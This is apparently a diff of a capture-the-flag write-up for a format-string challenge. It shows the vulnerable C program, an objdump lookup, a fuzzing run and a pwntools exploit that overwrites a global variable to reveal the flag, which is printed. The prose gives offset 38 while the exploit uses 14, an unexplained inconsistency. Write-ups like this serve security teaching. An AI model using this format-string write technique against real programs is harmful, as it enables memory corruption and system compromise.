@@ -14,9 +14,9 @@ This program is not impressed by cheap parlor tricks like reading arbitrary data
 
 ## Solution
 
-After running initial checks, look at the behavior:
+After running your inital checks, lets look at the behavior of the binary.
 
-```
+```jsx
 You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
 a
 Here's your input: a
@@ -24,9 +24,9 @@ sus = 0x21737573
 You can do better!
 ```
 
-We need to change "sus". Looking at the source code:
+We see we need to change "sus". Lets look at the source code to see what we need to change it to.
 
-```c
+```jsx
 #include <stdio.h>
 
 int sus = 0x21737573;
@@ -45,8 +45,11 @@ int main() {
 
   if (sus == 0x67616c66) {
     printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");
+
+    // Read in the flag
     FILE *fd = fopen("flag.txt", "r");
     fgets(flag, 64, fd);
+
     printf("%s", flag);
     fflush(stdout);
   }
@@ -55,34 +58,49 @@ int main() {
     printf("You can do better!\n");
     fflush(stdout);
   }
+
   return 0;
 }
 ```
 
-Format string vulnerability in buf. Need to change sus to 0x67616c66. After fuzzing, our input starts at position 14 (for fmtstr_payload). Find sus address with objdump:
+We see that there's a format string vulnerability when receiving our input in buf. We also see that it's doing a check on sus to the value  0x67616c66. We almost have everything, but we need to know where we start reading our own buffer and the address of sus. After some fuzzing, you will see that we start reading our input at position 38. We can also do a objdump to find the address of sus.
 
-```bash
-$ objdump -t vuln | grep sus
+```jsx
+amichel2579-academy@webshell:~/format-string2$ objdump -t vuln | grep sus
 0000000000404048 g     O .data  0000000000000004              sus
+amichel2579-academy@webshell:~/format-string2$
 ```
+
+```jsx
+amichel2579-academy@webshell:~/format-string2$ ./vuln
+You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
+aaaaaaaaaaaaa%38$s
+Here's your input: aaaaaaaaaaaaabu|
+sus = 0x21737573
+You can do better!
+```
+
+We now have everything we need to build our exploit.
 
 ### Exploit
 
-```python
+```jsx
 from pwn import *
 elf = context.binary = ELF("./vuln")
 p = process("./vuln")
+
 #p = remote('chatelaine.cylabacademy.net', 38239)
 sus = 0x404048
 flag = 0x67616c66
 payload = fmtstr_payload(14, {sus : flag})
+#p.send("%14$p")
 p.sendline(payload)
 p.interactive()
 ```
 
 ## Flag
 
-```
+```jsx
 academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}
 ```
 
